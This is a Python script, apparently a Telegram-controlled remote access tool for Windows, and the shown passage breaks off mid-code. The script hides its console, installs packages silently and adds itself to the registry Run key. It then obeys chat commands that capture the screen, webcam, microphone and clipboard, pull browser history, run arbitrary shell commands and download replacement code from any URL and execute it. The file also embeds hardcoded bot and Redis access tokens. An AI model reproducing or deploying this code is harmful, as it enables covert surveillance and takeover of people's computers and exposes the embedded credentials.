import subprocess
import sys
import os
import threading
import time
import io
import json
import urllib.parse
import socket
import platform
import webbrowser

# Автоустановка зависимостей
PACKAGES = ["pillow", "requests", "pyTelegramBotAPI", "psutil", "pyautogui", "opencv-python", "sounddevice", "scipy"]
for pkg in PACKAGES:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

# Скрыть консоль на Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Автозапуск
def add_to_startup():
    if sys.platform != "win32":
        return
    import winreg
    if getattr(sys, 'frozen', False):
        cmd = f'"{os.path.abspath(sys.executable)}"'
    else:
        script_path = os.path.abspath(__file__)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        cmd = f'"{pythonw}" "{script_path}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "PCControlBot", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)

try:
    add_to_startup()
except Exception:
    pass

import telebot
import psutil
import pyautogui
import cv2
import sounddevice as sd
from scipy.io.wavfile import write as wav_write
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from PIL import ImageGrab
import requests as req

pyautogui.FAILSAFE = False

# ==============================
BOT_TOKEN   = "8369819060:AAEC_GjpRz265vAnw83AYfCh4VWURh0ns8U"
CHAT_ID     = 1861646465
# Имя ПК — берётся из файла если есть, иначе hostname
_name_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".pcname")
if os.path.exists(_name_file):
    with open(_name_file, "r", encoding="utf-8") as _f:
        PC_NAME = _f.read().strip() or socket.gethostname()
else:
    PC_NAME = socket.gethostname()

REDIS_URL   = "https://equipped-goshawk-68311.upstash.io"
REDIS_TOKEN = "gQAAAAAAAQrXAAIncDJmOWVmZWQ2N2I4MWE0MjQ5Yjk0MGEzM2FhZDZhNzM3M3AyNjgzMTE"
# ==============================

bot = telebot.TeleBot(BOT_TOKEN)
fm_paths = {}
fm_cur   = {}
selected_pc = {}

REDIS_HEADERS = {
    "Authorization": f"Bearer {REDIS_TOKEN}",
    "Content-Type": "application/json"
}

# ─── Redis ────────────────────────────────────────────────

def redis_set(key, value, ex=90):
    try:
        req.post(f"{REDIS_URL}/set/{urllib.parse.quote(key)}/{urllib.parse.quote(str(value))}/ex/{ex}",
                 headers=REDIS_HEADERS, timeout=5)
    except Exception:
        pass

def redis_get(key):
    try:
        r = req.get(f"{REDIS_URL}/get/{urllib.parse.quote(key)}", headers=REDIS_HEADERS, timeout=5)
        return r.json().get("result")
    except Exception:
        return None

def redis_del(key):
    try:
        req.get(f"{REDIS_URL}/del/{urllib.parse.quote(key)}", headers=REDIS_HEADERS, timeout=5)
    except Exception:
        pass

def redis_keys(pattern):
    try:
        r = req.get(f"{REDIS_URL}/keys/{urllib.parse.quote(pattern)}", headers=REDIS_HEADERS, timeout=5)
        return r.json().get("result", [])
    except Exception:
        return []

# ─── Регистрация ПК ───────────────────────────────────────

def register_pc():
    while True:
        try:
            info = json.dumps({
                "name": PC_NAME,
                "ip": socket.gethostbyname(socket.gethostname()),
                "os": f"{platform.system()} {platform.release()}",
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
            })
            redis_set(f"pc:{PC_NAME}", info, ex=90)
        except Exception:
            pass
        time.sleep(30)

def get_online_pcs():
    keys = redis_keys("pc:*")
    pcs = []
    for key in keys:
        val = redis_get(key)
        if val:
            try:
                pcs.append(json.loads(urllib.parse.unquote(val) if '%' in val else val))
            except Exception:
                pass
    return pcs

# ─── Команды через Redis (межПК общение) ──────────────────

def send_command_to_pc(target_pc, command, args=""):
    """Отправить команду на конкретный ПК через Redis"""
    payload = json.dumps({"cmd": command, "args": args, "from_chat": CHAT_ID})
    redis_set(f"cmd:{target_pc}", payload, ex=30)

def poll_commands():
    """Слушать команды адресованные этому ПК и выполнять их"""
    while True:
        try:
            raw = redis_get(f"cmd:{PC_NAME}")
            if raw:
                redis_del(f"cmd:{PC_NAME}")
                try:
                    data = json.loads(urllib.parse.unquote(raw) if '%' in raw else raw)
                    execute_command(data["cmd"], data.get("args", ""))
                except Exception as e:
                    bot.send_message(CHAT_ID, f"❌ Ошибка команды на {PC_NAME}: {e}")
        except Exception:
            pass
        time.sleep(1)

def execute_command(cmd, args=""):
    """Выполнить команду и отправить результат в Telegram"""
    try:
        if cmd == "ss":
            buf = take_screenshot()
            bot.send_photo(CHAT_ID, buf, caption=f"🖥 <b>{PC_NAME}</b>", parse_mode='HTML')

        elif cmd == "sysinfo":
            cpu = psutil.cpu_percent(interval=1)
            ram = psutil.virtual_memory()
            disk = psutil.disk_usage('C:\\' if sys.platform == 'win32' else '/')
            uptime_min = int((time.time() - psutil.boot_time()) // 60)
            try: ip = socket.gethostbyname(socket.gethostname())
            except: ip = "?"
            bot.send_message(CHAT_ID, (
                f"🖥 <b>{PC_NAME}</b>\n\n"
                f"💻 ОС: {platform.system()} {platform.release()}\n"
                f"🌐 IP: <code>{ip}</code>\n"
                f"🔲 CPU: {cpu}%\n"
                f"💾 RAM: {ram.used//1024//1024} MB / {ram.total//1024//1024} MB ({ram.percent}%)\n"
                f"💿 Диск: {disk.used//1024**3} GB / {disk.total//1024**3} GB ({disk.percent}%)\n"
                f"⏱ Аптайм: {uptime_min} мин"
            ), parse_mode='HTML')

        elif cmd == "tasks":
            procs = get_processes()
            text = f"🖥 <b>{PC_NAME}</b> — процессы:\n\n"
            for pid, name, mem in procs:
                text += f"<code>{pid:6}</code>  {mem:4} MB  {name}\n"
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = [InlineKeyboardButton(f"❌ {n[:18]}", callback_data=f"kill_{p}")
                       for p, n, m in procs[:10]]
            markup.add(*buttons)
            bot.send_message(CHAT_ID, text, parse_mode='HTML', reply_markup=markup)

        elif cmd == "kill":
            killed = kill_process(name=args)
            bot.send_message(CHAT_ID, f"🖥 <b>{PC_NAME}</b>:\n" +
                ("✅ Убито:\n" + "\n".join(killed) if killed else f"❌ '{args}' не найден"), parse_mode='HTML')

        elif cmd == "killpid":
            killed = kill_process(pid=int(args))
            bot.send_message(CHAT_ID, f"🖥 <b>{PC_NAME}</b>:\n" +
                ("✅ Убито:\n" + "\n".join(killed) if killed else "❌ PID не найден"), parse_mode='HTML')

        elif cmd == "files":
            if not args:
                # Показать список дисков
                markup = InlineKeyboardMarkup(row_width=3)
                buttons = []
                if CHAT_ID not in fm_paths:
                    fm_paths[CHAT_ID] = {}
                for part in psutil.disk_partitions():
                    try:
                        usage = psutil.disk_usage(part.mountpoint)
                        free_gb = usage.free // 1024**3
                        total_gb = usage.total // 1024**3
                        label = f"💿 {part.device.replace(chr(92), '')}  {free_gb}/{total_gb}GB"
                        idx = len(fm_paths[CHAT_ID])
                        fm_paths[CHAT_ID][idx] = part.mountpoint
                        buttons.append(InlineKeyboardButton(label, callback_data=f"fmcd_{idx}"))
                    except Exception:
                        pass
                markup.add(*buttons)
                bot.send_message(CHAT_ID, f"💿 <b>{PC_NAME}</b> — выбери диск:", parse_mode='HTML', reply_markup=markup)
            else:
                path = args if os.path.exists(args) else fm_cur.get(CHAT_ID, "C:\\")
                fm_cur[CHAT_ID] = path
                markup = build_fm_keyboard(CHAT_ID, path)
                bot.send_message(CHAT_ID, f"📂 <b>{PC_NAME}</b>\n<code>{path}</code>",
                                 parse_mode='HTML', reply_markup=markup)

        elif cmd == "shutdown":
            bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b> выключается...", parse_mode='HTML')
            subprocess.run(["shutdown", "/s", "/t", "5"])

        elif cmd == "reboot":
            bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b> перезагружается...", parse_mode='HTML')
            subprocess.run(["shutdown", "/r", "/t", "5"])

        elif cmd == "sleep":
            bot.send_message(CHAT_ID, f"💤 <b>{PC_NAME}</b> уходит в сон...", parse_mode='HTML')
            subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0"])

        elif cmd == "vol":
            level = max(0, min(100, int(args)))
            subprocess.run(["powershell", "-c",
                f"$wsh=New-Object -ComObject WScript.Shell; "
                f"1..50|%{{$wsh.SendKeys([char]174)}}; "
                f"$s=[math]::Round({level}/2); 1..$s|%{{$wsh.SendKeys([char]175)}}"],
                capture_output=True)
            bot.send_message(CHAT_ID, f"🔊 <b>{PC_NAME}</b>: громкость {level}%", parse_mode='HTML')

        elif cmd == "mute":
            subprocess.run(["powershell", "-c",
                "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"], capture_output=True)
            bot.send_message(CHAT_ID, f"🔇 <b>{PC_NAME}</b>: звук выключен", parse_mode='HTML')

        elif cmd == "unmute":
            subprocess.run(["powershell", "-c",
                "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"], capture_output=True)
            bot.send_message(CHAT_ID, f"🔊 <b>{PC_NAME}</b>: звук включён", parse_mode='HTML')

        elif cmd == "mouse":
            x, y = map(int, args.split())
            pyautogui.moveTo(x, y, duration=0.3)
            bot.send_message(CHAT_ID, f"🖱 <b>{PC_NAME}</b>: мышь → ({x}, {y})", parse_mode='HTML')

        elif cmd == "click":
            if args:
                x, y = map(int, args.split())
                pyautogui.click(x, y)
            else:
                pyautogui.click()
            bot.send_message(CHAT_ID, f"🖱 <b>{PC_NAME}</b>: клик!", parse_mode='HTML')

        elif cmd == "rclick":
            if args:
                x, y = map(int, args.split())
                pyautogui.rightClick(x, y)
            else:
                pyautogui.rightClick()
            bot.send_message(CHAT_ID, f"🖱 <b>{PC_NAME}</b>: правый клик!", parse_mode='HTML')

        elif cmd == "scroll":
            pyautogui.scroll(int(args) if args else 3)
            bot.send_message(CHAT_ID, f"🖱 <b>{PC_NAME}</b>: скролл", parse_mode='HTML')

        elif cmd == "type":
            pyautogui.write(args, interval=0.05)
            bot.send_message(CHAT_ID, f"⌨️ <b>{PC_NAME}</b>: напечатано", parse_mode='HTML')

        elif cmd == "key":
            keys = args.strip().split('+')
            if len(keys) > 1: pyautogui.hotkey(*keys)
            else: pyautogui.press(keys[0])
            bot.send_message(CHAT_ID, f"⌨️ <b>{PC_NAME}</b>: нажато {args}", parse_mode='HTML')

        elif cmd == "open":
            if args.startswith("http://") or args.startswith("https://"):
                webbrowser.open(args)
            else:
                subprocess.Popen(args, shell=True)
            bot.send_message(CHAT_ID, f"🌐 <b>{PC_NAME}</b>: открыто {args}", parse_mode='HTML')

        elif cmd == "search":
            url = f"https://www.google.com/search?q={urllib.parse.quote(args)}"
            webbrowser.open(url)
            bot.send_message(CHAT_ID, f"🔍 <b>{PC_NAME}</b>: ищу «{args}»", parse_mode='HTML')

        elif cmd == "clip":
            result = subprocess.run(["powershell", "-c", "Get-Clipboard"],
                                    capture_output=True, text=True, encoding='utf-8', errors='replace')
            text = result.stdout.strip() or "пуст"
            if len(text) > 4000: text = text[:4000] + "\n...(обрезано)"
            bot.send_message(CHAT_ID, f"📋 <b>{PC_NAME}</b>:\n<code>{text}</code>", parse_mode='HTML')

        elif cmd == "notify":
            subprocess.run(["powershell", "-c",
                f'Add-Type -AssemblyName System.Windows.Forms; '
                f'[System.Windows.Forms.MessageBox]::Show("{args}", "{PC_NAME}")'],
                capture_output=True)
            bot.send_message(CHAT_ID, f"🔔 <b>{PC_NAME}</b>: уведомление отправлено!", parse_mode='HTML')

        elif cmd == "mic":
            seconds = min(int(args) if args.isdigit() else 5, 60)
            bot.send_message(CHAT_ID, f"🎤 <b>{PC_NAME}</b>: записываю {seconds} сек...", parse_mode='HTML')
            fs = 44100
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
            sd.wait()
            tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "mic_rec.wav")
            wav_write(tmp, fs, recording)
            with open(tmp, 'rb') as f:
                bot.send_audio(CHAT_ID, f, caption=f"🎤 {PC_NAME} — {seconds} сек")
            os.remove(tmp)

        elif cmd == "cam":
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: камера не найдена", parse_mode='HTML'); return
            time.sleep(0.5)
            ret, frame = cap.read()
            cap.release()
            if not ret:
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: не удалось сделать фото", parse_mode='HTML'); return
            tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "cam_shot.jpg")
            cv2.imwrite(tmp, frame)
            with open(tmp, 'rb') as f:
                bot.send_photo(CHAT_ID, f, caption=f"📷 {PC_NAME}")
            os.remove(tmp)

        elif cmd == "video":
            seconds = min(int(args) if args.isdigit() else 5, 30)
            bot.send_message(CHAT_ID, f"🎥 <b>{PC_NAME}</b>: снимаю {seconds} сек...", parse_mode='HTML')
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: камера не найдена", parse_mode='HTML'); return
            tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "cam_video.avi")
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            out = cv2.VideoWriter(tmp, fourcc, 20.0, (w, h))
            start = time.time()
            while time.time() - start < seconds:
                ret, frame = cap.read()
                if ret: out.write(frame)
            cap.release(); out.release()
            with open(tmp, 'rb') as f:
                bot.send_video(CHAT_ID, f, caption=f"🎥 {PC_NAME} — {seconds} сек")
            os.remove(tmp)




        elif cmd == "disconnect":
            bot.send_message(CHAT_ID, f"🔌 <b>{PC_NAME}</b>: отключаюсь...", parse_mode='HTML')
            time.sleep(1)
            os._exit(0)

        elif cmd == "rename":
            new_name = args.strip()
            if not new_name:
                bot.send_message(CHAT_ID, f"❌ Укажи имя: /rename Домашний", parse_mode='HTML')
            else:
                name_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".pcname")
                with open(name_file, "w", encoding="utf-8") as f:
                    f.write(new_name)
                old_name = PC_NAME
                bot.send_message(CHAT_ID, f"✅ ПК переименован: <b>{old_name}</b> → <b>{new_name}</b>\nПерезапускаюсь...", parse_mode='HTML')
                time.sleep(1)
                if getattr(sys, 'frozen', False):
                    subprocess.Popen([sys.executable])
                else:
                    script_path = os.path.abspath(__file__)
                    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
                    if not os.path.exists(pythonw):
                        pythonw = sys.executable
                    subprocess.Popen([pythonw, script_path])
                os._exit(0)

        elif cmd == "update":
            # args = прямая ссылка на новый .pyw файл
            bot.send_message(CHAT_ID, f"🔄 <b>{PC_NAME}</b>: скачиваю обновление...", parse_mode='HTML')
            try:
                r = req.get(args, timeout=30)
                r.raise_for_status()
                script_path = os.path.abspath(__file__)
                backup_path = script_path + ".bak"
                # Сохранить бэкап
                import shutil
                shutil.copy2(script_path, backup_path)
                # Записать новый файл
                with open(script_path, 'w', encoding='utf-8') as f:
                    f.write(r.text)
                bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b>: обновление скачано, перезапускаюсь...", parse_mode='HTML')
                time.sleep(2)
                # Перезапуск
                if getattr(sys, 'frozen', False):
                    subprocess.Popen([sys.executable], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform=="win32" else 0)
                else:
                    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
                    if not os.path.exists(pythonw):
                        pythonw = sys.executable
                    subprocess.Popen([pythonw, script_path], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform=="win32" else 0)
                os._exit(0)
            except Exception as e:
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: ошибка обновления: {e}", parse_mode='HTML')


        elif cmd == "record":
            seconds = min(int(args) if args.isdigit() else 10, 60)
            bot.send_message(CHAT_ID, f"🎥 <b>{PC_NAME}</b>: записываю экран {seconds} сек...", parse_mode='HTML')
            try:
                import numpy as np
                frames = []
                start = time.time()
                while time.time() - start < seconds:
                    img = ImageGrab.grab()
                    frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))
                    time.sleep(0.1)
                if not frames:
                    bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: нет кадров", parse_mode='HTML'); return
                h, w = frames[0].shape[:2]
                tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "screen_record.avi")
                out = cv2.VideoWriter(tmp, cv2.VideoWriter_fourcc(*'XVID'), 10, (w, h))
                for f in frames:
                    out.write(f)
                out.release()
                with open(tmp, 'rb') as f:
                    bot.send_video(CHAT_ID, f, caption=f"🎥 Запись экрана {seconds} сек — {PC_NAME}")
                os.remove(tmp)
            except Exception as e:
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: ошибка записи: {e}", parse_mode='HTML')

        elif cmd == "disks":
            text = f"💿 <b>{PC_NAME}</b> — диски:\n\n"
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    text += (f"<b>{part.device}</b> ({part.fstype})\n"
                             f"  Всего: {usage.total//1024**3} GB\n"
                             f"  Занято: {usage.used//1024**3} GB ({usage.percent}%)\n"
                             f"  Свободно: {usage.free//1024**3} GB\n\n")
                except Exception:
                    text += f"<b>{part.device}</b> — нет доступа\n\n"
            bot.send_message(CHAT_ID, text, parse_mode='HTML')

        elif cmd == "upload":
            # args = "путь|base64данные"
            import base64
            sep = args.index("|")
            save_path = args[:sep]
            data = base64.b64decode(args[sep+1:])
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, 'wb') as f:
                f.write(data)
            bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b>: файл сохранён → <code>{save_path}</code>", parse_mode='HTML')


        elif cmd == "ss_game":
            # Скриншот через Windows Graphics Capture (работает с играми/DirectX)
            try:
                import ctypes
                # Используем PrintWindow через win32 API
                result = subprocess.run([
                    "powershell", "-c",
                    "Add-Type -AssemblyName System.Windows.Forms; "
                    "$bmp = [System.Windows.Forms.Screen]::PrimaryScreen; "
                    "$b = New-Object System.Drawing.Bitmap($bmp.Bounds.Width, $bmp.Bounds.Height); "
                    "$g = [System.Drawing.Graphics]::FromImage($b); "
                    "$g.CopyFromScreen($bmp.Bounds.Location, [System.Drawing.Point]::Empty, $bmp.Bounds.Size); "
                    "$b.Save('$env:TEMP\\ss_game.png'); "
                    "$g.Dispose(); $b.Dispose()"
                ], capture_output=True, timeout=10)
                tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "ss_game.png")
                if os.path.exists(tmp):
                    with open(tmp, 'rb') as f:
                        bot.send_photo(CHAT_ID, f, caption=f"🎮 <b>{PC_NAME}</b> — скриншот (игровой режим)", parse_mode='HTML')
                    os.remove(tmp)
                else:
                    # Fallback через PIL с all_screens
                    buf = io.BytesIO()
                    ImageGrab.grab(all_screens=True).save(buf, format='PNG')
                    buf.seek(0)
                    bot.send_photo(CHAT_ID, buf, caption=f"🎮 <b>{PC_NAME}</b>", parse_mode='HTML')
            except Exception as e:
                bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b>: {e}", parse_mode='HTML')

        elif cmd == "history":
            import sqlite3, shutil
            limit = int(args) if args and args.isdigit() else 15
            limit = min(limit, 100)
            results = []
            browsers = {
                "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
                "Edge":   os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"),
                "Firefox": None
            }
            ff_base = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
            if os.path.exists(ff_base):
                for profile in os.listdir(ff_base):
                    ff_db = os.path.join(ff_base, profile, "places.sqlite")
                    if os.path.exists(ff_db):
                        browsers["Firefox"] = ff_db
                        break
            for browser, db_path in browsers.items():
                if not db_path or not os.path.exists(db_path):
                    continue
                try:
                    tmp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"hist_{browser}.db")
                    shutil.copy2(db_path, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cur = conn.cursor()
                    if browser == "Firefox":
                        cur.execute(f"SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
                    else:
                        cur.execute(f"SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
                    rows = cur.fetchall()
                    conn.close()
                    os.remove(tmp_db)
                    if rows:
                        results.append(f"\n<b>🌐 {browser}:</b>")
                        for i, (url, title, cnt) in enumerate(rows, 1):
                            t = (title or url)[:50]
                            results.append(f"  {i}. {t}")
                except Exception as e:
                    results.append(f"<b>{browser}:</b> ❌ {e}")
            if results:
                text = f"📝 <b>{PC_NAME}</b> — история (топ {limit}):" + "\n".join(results)
                if len(text) > 4000:
                    text = text[:4000] + "\n...(обрезано)"
                bot.send_message(CHAT_ID, text, parse_mode='HTML')
            else:
                bot.send_message(CHAT_ID, f"📝 <b>{PC_NAME}</b>: история не найдена", parse_mode='HTML')

        elif cmd == "cmd":
            result = subprocess.run(args, shell=True, capture_output=True,
                                    text=True, timeout=15, encoding='cp866', errors='replace')
            output = (result.stdout or result.stderr or "Нет вывода").strip()
            if len(output) > 4000: output = output[:4000] + "\n...(обрезано)"
            bot.send_message(CHAT_ID, f"💻 <b>{PC_NAME}</b>:\n<code>{output}</code>", parse_mode='HTML')

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ <b>{PC_NAME}</b> — ошибка команды '{cmd}': {e}", parse_mode='HTML')

# ─── Запуск фоновых потоков ───────────────────────────────

def notify_startup():
    time.sleep(3)
    try:
        ip = socket.gethostbyname(socket.gethostname())
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        bot.send_message(CHAT_ID,
            f"🟢 <b>{PC_NAME}</b> — онлайн!\n\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"💻 ОС: {platform.system()} {platform.release()}\n"
            f"🔲 CPU: {cpu}%\n"
            f"💾 RAM: {ram.used//1024//1024} MB / {ram.total//1024//1024} MB\n\n"
            f"Используй /pcs чтобы переключаться между ПК",
            parse_mode='HTML')
    except Exception:
        pass

threading.Thread(target=notify_startup, daemon=True).start()
threading.Thread(target=register_pc, daemon=True).start()
threading.Thread(target=poll_commands, daemon=True).start()

# ─── Утилиты ──────────────────────────────────────────────

def is_authorized(message):
    return message.chat.id == CHAT_ID

def auth_cb(call):
    return call.message.chat.id == CHAT_ID

def take_screenshot():
    buf = io.BytesIO()
    ImageGrab.grab().save(buf, format='PNG')
    buf.seek(0)
    return buf

def get_processes():
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            mem = p.info['memory_info'].rss // (1024 * 1024)
            procs.append((p.info['pid'], p.info['name'], mem))
        except Exception:
            pass
    procs.sort(key=lambda x: x[2], reverse=True)
    return procs[:30]

def kill_process(pid=None, name=None):
    killed = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            if (pid and p.info['pid'] == pid) or \
               (name and name.lower() in p.info['name'].lower()):
                p.kill()
                killed.append(f"{p.info['name']} (PID {p.info['pid']})")
        except Exception:
            pass
    return killed

def build_fm_keyboard(chat_id, path):
    if chat_id not in fm_paths:
        fm_paths[chat_id] = {}
    store = fm_paths[chat_id]
    markup = InlineKeyboardMarkup(row_width=1)
    try:
        items = sorted(os.listdir(path), key=lambda x: (not os.path.isdir(os.path.join(path, x)), x.lower()))
        dirs  = [i for i in items if os.path.isdir(os.path.join(path, i))]
        files = [i for i in items if os.path.isfile(os.path.join(path, i))]
        parent = os.path.dirname(path)
        if parent and parent != path:
            idx = len(store); store[idx] = parent
            markup.add(InlineKeyboardButton("⬆️ Назад", callback_data=f"fmcd_{idx}"))
        for d in dirs[:12]:
            full = os.path.join(path, d)
            idx = len(store); store[idx] = full
            markup.add(InlineKeyboardButton(f"📁 {d[:40]}", callback_data=f"fmcd_{idx}"))
        for f in files[:12]:
            full = os.path.join(path, f)
            try:
                size = os.path.getsize(full)
                label = f"📄 {f[:30]} ({size//1024} KB)"
            except Exception:
                label = f"📄 {f[:40]}"
            idx = len(store); store[idx] = full
            markup.add(InlineKeyboardButton(label, callback_data=f"fmdl_{idx}"))
    except PermissionError:
        markup.add(InlineKeyboardButton("⛔ Нет доступа", callback_data="noop"))
    except Exception as e:
        markup.add(InlineKeyboardButton(f"❌ {str(e)[:30]}", callback_data="noop"))
    return markup

def get_selected(chat_id):
    return selected_pc.get(chat_id, PC_NAME)

def pcs_keyboard():
    pcs = get_online_pcs()
    markup = InlineKeyboardMarkup(row_width=1)
    if not pcs:
        markup.add(InlineKeyboardButton("😴 Нет онлайн ПК", callback_data="noop"))
    else:
        for pc in pcs:
            label = f"🟢 {pc['name']}  |  CPU {pc.get('cpu','?')}%  RAM {pc.get('ram','?')}%"
            markup.add(InlineKeyboardButton(label, callback_data=f"selpc_{pc['name']}"))
            # Кнопки управления питанием для каждого ПК
            markup.add(
                InlineKeyboardButton(f"⛔ Выкл", callback_data=f"power_shutdown_{pc['name']}"),
                InlineKeyboardButton(f"🔄 Ребут", callback_data=f"power_reboot_{pc['name']}"),
                InlineKeyboardButton(f"💤 Сон", callback_data=f"power_sleep_{pc['name']}")
            )
            markup.add(
                InlineKeyboardButton(f"🔌 Отключить доступ", callback_data=f"disc_{pc['name']}")
            )
    return markup, pcs

def route(message, cmd, args=""):
    """Роутинг — если выбран этот ПК выполняем сразу, иначе через Redis"""
    target = get_selected(message.chat.id)
    if target == PC_NAME:
        threading.Thread(target=execute_command, args=(cmd, args), daemon=True).start()
    else:
        send_command_to_pc(target, cmd, args)
        bot.reply_to(message, f"📤 Команда отправлена на <b>{target}</b>...", parse_mode='HTML')

# ─── Handlers ─────────────────────────────────────────────

@bot.message_handler(commands=['start', 'help'])
def start(message):
    if not is_authorized(message): return
    current = get_selected(message.chat.id)
    bot.reply_to(message, (
        f"🖥 Бот управления ПК\n"
        f"Сейчас выбран: <b>{current}</b>\n\n"
        "/pcs — список ПК и переключение\n\n"
        "/ss — скриншот\n"
        "/sysinfo — инфо о системе\n"
        "/tasks — процессы\n"
        "/kill имя | /killpid PID\n"
        "/files — файловый менеджер\n"
        "/vol 50 | /mute | /unmute\n"
        "/shutdown | /reboot | /sleep\n"
        "/mouse x y | /click | /rclick\n"
        "/scroll 3 | /type текст | /key ctrl+c\n"
        "/open ссылка | /search запрос\n"
        "/mic 5 | /cam | /video 5\n"
        "/clip | /notify текст\n"
        "/cmd команда\n"
    ), parse_mode='HTML')

@bot.message_handler(commands=['pcs'])
def show_pcs(message):
    if not is_authorized(message): return
    markup, pcs = pcs_keyboard()
    current = get_selected(message.chat.id)
    bot.reply_to(message,
        f"🖥 Онлайн ПК: <b>{len(pcs)}</b>\n"
        f"Сейчас выбран: <b>{current}</b>\n\n"
        f"Нажми чтобы переключиться:",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("selpc_"))
def callback_selpc(call):
    if not auth_cb(call): return
    pc = call.data[6:]
    selected_pc[call.message.chat.id] = pc
    bot.answer_callback_query(call.id, f"✅ Выбран: {pc}")
    bot.edit_message_text(
        f"✅ Выбран ПК: <b>{pc}</b>\n\nТеперь все команды идут на этот ПК.",
        call.message.chat.id, call.message.message_id, parse_mode='HTML')

@bot.message_handler(commands=['ss', 'screenshot'])
def cmd_ss(message):
    if not is_authorized(message): return
    route(message, "ss")

@bot.message_handler(commands=['sysinfo'])
def cmd_sysinfo(message):
    if not is_authorized(message): return
    route(message, "sysinfo")

@bot.message_handler(commands=['tasks'])
def cmd_tasks(message):
    if not is_authorized(message): return
    route(message, "tasks")

@bot.message_handler(commands=['kill'])
def cmd_kill(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /kill chrome"); return
    route(message, "kill", parts[1])

@bot.message_handler(commands=['killpid'])
def cmd_killpid(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /killpid 1234"); return
    route(message, "killpid", parts[1])

@bot.callback_query_handler(func=lambda call: call.data.startswith("kill_"))
def callback_kill(call):
    if not auth_cb(call): return
    pid = int(call.data.split("_")[1])
    killed = kill_process(pid=pid)
    if killed:
        bot.answer_callback_query(call.id, f"✅ {killed[0]}")
        bot.send_message(call.message.chat.id, f"✅ Убито: {killed[0]}")
    else:
        bot.answer_callback_query(call.id, "❌ Уже не существует")

@bot.message_handler(commands=['files'])
def cmd_files(message):
    if not is_authorized(message): return
    # Показать выбор диска
    target = get_selected(message.chat.id)
    if target == PC_NAME:
        # Получить список дисков локально
        markup = InlineKeyboardMarkup(row_width=3)
        buttons = []
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                free_gb = usage.free // 1024**3
                total_gb = usage.total // 1024**3
                label = f"💿 {part.device.replace(chr(92), '')}  {free_gb}/{total_gb}GB"
                idx = len(fm_paths.get(message.chat.id, {}))
                if message.chat.id not in fm_paths:
                    fm_paths[message.chat.id] = {}
                fm_paths[message.chat.id][idx] = part.mountpoint
                buttons.append(InlineKeyboardButton(label, callback_data=f"fmcd_{idx}"))
            except Exception:
                pass
        markup.add(*buttons)
        bot.reply_to(message, "💿 Выбери диск:", reply_markup=markup)
    else:
        send_command_to_pc(target, "files")
        bot.reply_to(message, f"📤 Команда отправлена на <b>{target}</b>...", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("fmcd_"))
